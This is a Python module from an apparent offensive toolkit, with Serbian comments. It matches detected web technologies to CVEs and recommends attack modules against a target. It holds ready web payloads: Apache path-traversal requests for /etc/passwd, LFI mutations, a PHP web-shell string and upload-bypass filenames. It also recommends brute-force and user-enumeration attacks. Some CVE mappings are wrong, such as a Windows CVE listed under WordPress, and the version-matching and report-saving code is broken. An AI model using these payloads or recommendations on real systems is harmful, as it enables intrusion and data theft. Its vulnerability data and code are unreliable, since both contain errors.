
#!/usr/bin/env python3
"""
ShadowFox21 - ShadowMatch Intelligence Module
===========================================
Automatski spaja tehnologije sa CVE-ovima i predlaže napade
"""

import json
import re
import os
import glob
from datetime import datetime
from pathlib import Path
import requests
import argparse

class ShadowMatch:
    def __init__(self, reports_folder="reports"):
        self.reports_folder = reports_folder
        self.tech_folder = os.path.join(reports_folder, "tech")
        
        # Vulnerability knowledge base
        self.vuln_db = self.load_vulnerability_database()
        
        # Attack recommendations
        self.attack_modules = self.load_attack_modules()
        
        # Results
        self.matches = []
        self.recommendations = []
        self.critical_vulns = []
        
        print("🧬 ShadowMatch Intelligence inicijalizovan")
        print(f"📁 Reports folder: {reports_folder}")
        print(f"🧠 Vulnerability DB entries: {len(self.vuln_db)}")
        print(f"⚔️ Attack modules loaded: {len(self.attack_modules)}")

    def load_vulnerability_database(self):
        """Učitava bazu poznatih vulnerability-ja"""
        vuln_db = {
            # Apache vulnerabilities
            'apache': {
                '2.4.49': [
                    {
                        'cve': 'CVE-2021-41773',
                        'severity': 'CRITICAL',
                        'type': 'Path Traversal + RCE',
                        'description': 'Path traversal and remote code execution',
                        'exploit': 'GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
                        'references': ['https://httpd.apache.org/security/vulnerabilities_24.html']
                    }
                ],
                '2.4.50': [
                    {
                        'cve': 'CVE-2021-42013',
                        'severity': 'CRITICAL', 
                        'type': 'Path Traversal + RCE',
                        'description': 'Bypass for CVE-2021-41773',
                        'exploit': 'GET /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd',
                        'references': ['https://httpd.apache.org/security/vulnerabilities_24.html']
                    }
                ],
                '2.2': [
                    {
                        'cve': 'CVE-2017-15715',
                        'severity': 'HIGH',
                        'type': 'File Upload Bypass',
                        'description': 'Upload restriction bypass with trailing newline',
                        'exploit': 'Upload file.php\\x0A',
                        'references': []
                    }
                ]
            },
            
            # PHP vulnerabilities
            'php': {
                '7.0': [
                    {
                        'cve': 'CVE-2019-11043',
                        'severity': 'CRITICAL',
                        'type': 'RCE via FPM',
                        'description': 'Remote code execution in PHP-FPM',
                        'exploit': 'Malformed fastcgi request',
                        'references': ['https://bugs.php.net/bug.php?id=78599']
                    }
                ],
                '7.1': [
                    {
                        'cve': 'CVE-2019-11043',
                        'severity': 'CRITICAL',
                        'type': 'RCE via FPM',
                        'description': 'Remote code execution in PHP-FPM',
                        'exploit': 'Malformed fastcgi request',
                        'references': ['https://bugs.php.net/bug.php?id=78599']
                    }
                ],
                '7.2': [
                    {
                        'cve': 'CVE-2019-11043',
                        'severity': 'CRITICAL',
                        'type': 'RCE via FPM',
                        'description': 'Remote code execution in PHP-FPM',
                        'exploit': 'Malformed fastcgi request',
                        'references': ['https://bugs.php.net/bug.php?id=78599']
                    }
                ]
            },
            
            # WordPress vulnerabilities
            'wordpress': {
                '5.8': [
                    {
                        'cve': 'CVE-2021-34527',
                        'severity': 'HIGH',
                        'type': 'Authentication Bypass',
                        'description': 'REST API authentication bypass',
                        'exploit': 'POST /wp-json/wp/v2/users with crafted headers',
                        'references': []
                    }
                ],
                '5.7': [
                    {
                        'cve': 'CVE-2021-29447',
                        'severity': 'CRITICAL',
                        'type': 'XXE in Media Library',
                        'description': 'XXE injection via media upload',
                        'exploit': 'Upload crafted WAV file with XXE payload',
                        'references': []
                    }
                ],
                'generic': [
                    {
                        'cve': 'Generic-WP-001',
                        'severity': 'MEDIUM',
                        'type': 'Login Brute Force',
                        'description': 'WordPress admin login susceptible to brute force',
                        'exploit': 'POST /wp-login.php with password lists',
                        'references': []
                    },
                    {
                        'cve': 'Generic-WP-002',
                        'severity': 'MEDIUM',
                        'type': 'User Enumeration',
                        'description': 'Username enumeration via REST API',
                        'exploit': 'GET /wp-json/wp/v2/users',
                        'references': []
                    }
                ]
            },
            
            # Drupal vulnerabilities
            'drupal': {
                '7': [
                    {
                        'cve': 'CVE-2018-7600',
                        'severity': 'CRITICAL',
                        'type': 'RCE - Drupalgeddon2',
                        'description': 'Remote code execution via form API',
                        'exploit': 'POST with crafted form parameters',
                        'references': ['https://www.drupal.org/sa-core-2018-002']
                    }
                ],
                '8': [
                    {
                        'cve': 'CVE-2018-7602', 
                        'severity': 'CRITICAL',
                        'type': 'RCE - Drupalgeddon3',
                        'description': 'Remote code execution via form API',
                        'exploit': 'POST with crafted form parameters',
                        'references': ['https://www.drupal.org/sa-core-2018-004']
                    }
                ]
            },
            
            # Nginx vulnerabilities
            'nginx': {
                '1.15': [
                    {
                        'cve': 'CVE-2019-20372',
                        'severity': 'HIGH',
                        'type': 'HTTP Request Smuggling',
                        'description': 'HTTP request smuggling vulnerability',
                        'exploit': 'Crafted HTTP headers',
                        'references': []
                    }
                ]
            },
            
            # IIS vulnerabilities  
            'iis': {
                '10.0': [
                    {
                        'cve': 'CVE-2017-7269',
                        'severity': 'CRITICAL',
                        'type': 'Buffer Overflow RCE',
                        'description': 'Buffer overflow in WebDAV',
                        'exploit': 'PROPFIND with long header',
                        'references': []
                    }
                ]
            }
        }
        
        return vuln_db

    def load_attack_modules(self):
        """Definише dostupne attack module i mutations"""
        modules = {
            'path_traversal': {
                'file': 'option_20_path_traversal.py',
                'description': 'Path traversal and LFI attacks',
                'parameters': ['/etc/passwd', '/windows/system32/drivers/etc/hosts'],
                'mutations': [
                    '../../../etc/passwd',
                    '....//....//....//etc/passwd',
                    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
                ]
            },
            'rce_php_fpm': {
                'file': 'option_21_php_fpm_rce.py',
                'description': 'PHP-FPM remote code execution',
                'parameters': ['<?php system($_GET["cmd"]); ?>'],
                'mutations': []
            },
            'wp_login_brute': {
                'file': 'option_09_wp_login_brute.py', 
                'description': 'WordPress login brute force',
                'parameters': ['admin', 'administrator', 'wp-admin'],
                'mutations': []
            },
            'wp_user_enum': {
                'file': 'option_10_wp_user_enum.py',
                'description': 'WordPress user enumeration',
                'parameters': ['/wp-json/wp/v2/users', '/?author=1'],
                'mutations': []
            },
            'drupal_rce': {
                'file': 'exploit_drupalgeddon.py',
                'description': 'Drupalgeddon RCE exploit',
                'parameters': ['user/register', 'node/add'],
                'mutations': []
            },
            'file_upload_bypass': {
                'file': 'upload_bypass.py', 
                'description': 'File upload restriction bypass',
                'parameters': [],
                'mutations': [
                    'file.php.jpg',
                    'file.php%00.jpg',
                    'file.php\\x0A',
                    'file.pHP',
                    'file.php5',
                    'file.phtml'
                ]
            },
            'http_request_smuggling': {
                'file': 'option_25_http_smuggling.py',
                'description': 'HTTP request smuggling attack',
                'parameters': [],
                'mutations': []
            },
            'xxe_injection': {
                'file': 'option_30_xxe_attack.py',
                'description': 'XXE injection via file upload',
                'parameters': [],
                'mutations': []
            }
        }
        
        return modules

    def find_latest_tech_report(self):
        """Pronalazi najnoviji tech_analysis report"""
        if not os.path.exists(self.tech_folder):
            print(f"❌ Tech folder ne postoji: {self.tech_folder}")
            return None
            
        pattern = os.path.join(self.tech_folder, "tech_analysis_*.json")
        files = glob.glob(pattern)
        
        if not files:
            print(f"❌ Nema tech_analysis_*.json fajlova u {self.tech_folder}")
            return None
            
        # Sortira po vremenu modifikacije
        latest_file = max(files, key=os.path.getmtime)
        print(f"📂 Najnoviji tech report: {latest_file}")
        
        return latest_file

    def load_tech_analysis(self, file_path=None):
        """Učitava tech analysis podatke"""
        if file_path is None:
            file_path = self.find_latest_tech_report()
            
        if not file_path:
            return None
            
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
            
            print(f"✅ Tech analysis učitan: {os.path.basename(file_path)}")
            return data
            
        except Exception as e:
            print(f"❌ Greška pri učitavanju: {e}")
            return None

    def extract_technologies(self, tech_data):
        """Izvlači tehnologije i verzije iz tech podataka"""
        technologies = []
        
        if not tech_data:
            return technologies
            
        # Iz results sekcije
        results = tech_data.get('results', {})
        
        # Server tehnologije
        server_info = results.get('server_info', {})
        if server_info:
            technologies.append({
                'name': 'server',
                'details': server_info,
                'version': server_info.get('version', 'unknown')
            })
        
        # Web tehnologije
        web_tech = results.get('web_technologies', [])
        for tech in web_tech:
            if isinstance(tech, dict):
                technologies.append({
                    'name': tech.get('name', '').lower(),
                    'version': tech.get('version', 'unknown'),
                    'details': tech
                })
            elif isinstance(tech, str):
                # Parse string format "Apache 2.4.49"
                parts = tech.split()
                if len(parts) >= 2:
                    name = parts[0].lower()
                    version = parts[1]
                    technologies.append({
                        'name': name,
                        'version': version,
                        'details': {'raw': tech}
                    })
        
        # CMS detektovani
        cms_info = results.get('cms_detected', {})
        if cms_info:
            technologies.append({
                'name': cms_info.get('name', '').lower(),
                'version': cms_info.get('version', 'unknown'),
                'details': cms_info
            })
        
        print(f"🔍 Izvučeno tehnologija: {len(technologies)}")
        for tech in technologies:
            print(f"   • {tech['name']} {tech['version']}")
            
        return technologies

    def match_vulnerabilities(self, technologies):
        """Spaja tehnologije sa vulnerability database"""
        matches = []
        
        for tech in technologies:
            tech_name = tech['name'].lower()
            tech_version = tech['version']
            
            # Traži u vuln_db
            if tech_name in self.vuln_db:
                vulns_for_tech = self.vuln_db[tech_name]
                
                # Prvo pokušava exact version match
                if tech_version in vulns_for_tech:
                    for vuln in vulns_for_tech[tech_version]:
                        match = {
                            'technology': tech,
                            'vulnerability': vuln,
                            'match_type': 'exact_version'
                        }
                        matches.append(match)
                
                # Zatim generic match
                if 'generic' in vulns_for_tech:
                    for vuln in vulns_for_tech['generic']:
                        match = {
                            'technology': tech,
                            'vulnerability': vuln,
                            'match_type': 'generic'
                        }
                        matches.append(match)
                
                # Version range matching (za brojčane verzije)
                if tech_version != 'unknown':
                    try:
                        tech_ver_float = float(tech_version.split('.')[0] + '.' + tech_version.split('.')[1])
                        
                        for version_key in vulns_for_tech:
                            if version_key not in ['generic']:
                                try:
                                    db_ver_float = float(version_key.split('.')[0] + '.' + version_key.split('.')[1])
                                    
                                    # Ako je tech verzija <= vulnerable verzija
                                    if tech_ver_float <= db_ver_float:
                                        for vuln in vulns_for_tech[version_key]:
                                            match = {
                                                'technology': tech,
                                                'vulnerability': vuln,
                                                'match_type': 'version_range'
                                            }
                                            matches.append(match)
                                except:
                                    pass
                    except:
                        pass
        
        print(f"🎯 Pronađeno vulnerability matchova: {len(matches)}")
        return matches

    def generate_recommendations(self, matches):
        """Generiše preporuke za napade"""
        recommendations = []
        
        for match in matches:
            tech = match['technology']
            vuln = match['vulnerability']
            
            # Mapira vulnerability tip na attack module
            attack_mapping = {
                'Path Traversal + RCE': 'path_traversal',
                'Path Traversal': 'path_traversal', 
                'RCE via FPM': 'rce_php_fpm',
                'Login Brute Force': 'wp_login_brute',
                'User Enumeration': 'wp_user_enum',
                'RCE - Drupalgeddon2': 'drupal_rce',
                'RCE - Drupalgeddon3': 'drupal_rce',
                'File Upload Bypass': 'file_upload_bypass',
                'HTTP Request Smuggling': 'http_request_smuggling',
                'XXE in Media Library': 'xxe_injection'
            }
            
            vuln_type = vuln['type']
            if vuln_type in attack_mapping:
                module_name = attack_mapping[vuln_type]
                module_info = self.attack_modules[module_name]
                
                recommendation = {
                    'technology': f"{tech['name']} {tech['version']}",
                    'vulnerability': {
                        'cve': vuln['cve'],
                        'severity': vuln['severity'],
                        'type': vuln['type'],
                        'description': vuln['description']
                    },
                    'attack_module': {
                        'file': module_info['file'],
                        'description': module_info['description'],
                        'parameters': module_info['parameters'],
                        'mutations': module_info['mutations']
                    },
                    'exploit_example': vuln['exploit'],
                    'priority': self.calculate_priority(vuln['severity']),
                    'match_type': match['match_type']
                }
                
                recommendations.append(recommendation)
        
        # Sortira po prioritetu
        recommendations.sort(key=lambda x: x['priority'], reverse=True)
        
        print(f"💡 Generirano preporuka: {len(recommendations)}")
        return recommendations

    def calculate_priority(self, severity):
        """Računa prioritet na osnovu severity"""
        priority_map = {
            'CRITICAL': 100,
            'HIGH': 80,
            'MEDIUM': 60,
            'LOW': 40
        }
        return priority_map.get(severity, 20)

    def print_recommendations(self, target_info=None):
        """Prikazuje preporuke u čitljivom formatu"""
        if target_info:
            print(f"\n🎯 Target: {target_info}")
        
        print("\n" + "="*80)
        print("🧬 SHADOWMATCH INTELLIGENCE REPORT")
        print("="*80)
        
        if not self.recommendations:
            print("ℹ️  Nema preporuka - možda nema detektovanih tehnologija ili vulnerability matchova")
            return
        
        critical_count = len([r for r in self.recommendations if r['vulnerability']['severity'] == 'CRITICAL'])
        high_count = len([r for r in self.recommendations if r['vulnerability']['severity'] == 'HIGH'])
        
        print(f"\n📊 SUMMARY:")
        print(f"   🚨 Critical vulnerabilities: {critical_count}")
        print(f"   ⚠️  High vulnerabilities: {high_count}")
        print(f"   📋 Total recommendations: {len(self.recommendations)}")
        
        for i, rec in enumerate(self.recommendations, 1):
            severity_emoji = {
                'CRITICAL': '🚨',
                'HIGH': '⚠️', 
                'MEDIUM': '🔶',
                'LOW': '🟡'
            }
            
            print(f"\n{'-'*60}")
            print(f"#{i} {severity_emoji.get(rec['vulnerability']['severity'], '🔶')} {rec['vulnerability']['severity']}")
            print(f"🧠 Detektovana tehnologija: {rec['technology']}")
            print(f"🔓 {rec['vulnerability']['cve']} ({rec['vulnerability']['type']})")
            print(f"📝 {rec['vulnerability']['description']}")
            print(f"⚔️ Preporučeni modul: {rec['attack_module']['file']}")
            
            if rec['attack_module']['parameters']:
                print(f"🎯 Parametri: {', '.join(rec['attack_module']['parameters'])}")
            
            if rec['attack_module']['mutations']:
                print(f"🧬 Mutations:")
                for mutation in rec['attack_module']['mutations'][:3]:  # Pokazuje prve 3
                    print(f"   • {mutation}")
                if len(rec['attack_module']['mutations']) > 3:
                    print(f"   • ... i još {len(rec['attack_module']['mutations']) - 3}")
            
            print(f"💻 Exploit primer: {rec['exploit_example']}")

    def run_analysis(self, tech_file=None):
        """Pokreće punu analizu"""
        print(f"\n🚀 Početak ShadowMatch analize...")
        
        # Učitava tech podatke
        tech_data = self.load_tech_analysis(tech_file)
        if not tech_data:
            return False
        
        # Izvlači tehnologije
        technologies = self.extract_technologies(tech_data)
        if not technologies:
            print("❌ Nema detektovanih tehnologija!")
            return False
        
        # Spaja sa vulnerability database
        self.matches = self.match_vulnerabilities(technologies)
        if not self.matches:
            print("ℹ️  Nema pronađenih vulnerability matchova")
            return True
        
        # Generiše preporuke
        self.recommendations = self.generate_recommendations(self.matches)
        
        # Izdvaja kritične vulnerabilities
        self.critical_vulns = [r for r in self.recommendations if r['vulnerability']['severity'] == 'CRITICAL']
        
        return True

    def generate_report(self):
        """Generiše JSON izveštaj"""
        report = {
            'module': 'shadowmatch_intelligence',
            'analysis_info': {
                'timestamp': datetime.now().isoformat(),
                'vuln_db_entries': len(self.vuln_db),
                'attack_modules': len(self.attack_modules)
            },
            'statistics': {
                'vulnerability_matches': len(self.matches),
                'attack_recommendations': len(self.recommendations),
                'critical_vulnerabilities': len(self.critical_vulns)
            },
            'matches': self.matches,
            'recommendations': self.recommendations,
            'critical_vulnerabilities': self.critical_vulns,
            'attack_modules_available': self.attack_modules
        }
        
        return report

    import os
    from datetime import datetime
    import json

    def save_report(data):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"reports/shadowmatch/shadowmatch_report_{timestamp}.json"
        os.makedirs("reports/shadowmatch", exist_ok=True)

        with open(filename, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)

        print(f"\n💾 ShadowMatch izveštaj sačuvan: {filename}")

def main():
    parser = argparse.ArgumentParser(description='ShadowFox21 - ShadowMatch Intelligence Module')
    parser.add_argument('-f', '--file', help='Specific tech analysis JSON file')
    parser.add_argument('-r', '--reports', default='reports', help='Reports folder (default: reports)')
    parser.add_argument('-o', '--output', help='Output JSON file')
    parser.add_argument('--target', help='Target info for display')
    
    args = parser.parse_args()
    
    print("=" * 80)
    print("🧬 ShadowFox21 - ShadowMatch Intelligence Module")
    print("=" * 80)
    
    # Kreira ShadowMatch
    shadowmatch = ShadowMatch(reports_folder=args.reports)
    
    try:
        # Pokreće analizu
        if shadowmatch.run_analysis(args.file):
            # Prikazuje preporuke
            shadowmatch.print_recommendations(args.target)
            
            # Čuva izveštaj
            shadowmatch.save_report(args.output)
            
            print(f"\n🎯 ShadowMatch analiza završena uspešno!")
        else:
            print(f"\n❌ ShadowMatch analiza neuspešna!")
        
    except KeyboardInterrupt:
        print(f"\n⚠️  Analiza prekinuta...")
    except Exception as e:
        print(f"\n❌ Greška: {e}")

if __name__ == "__main__":
    main()

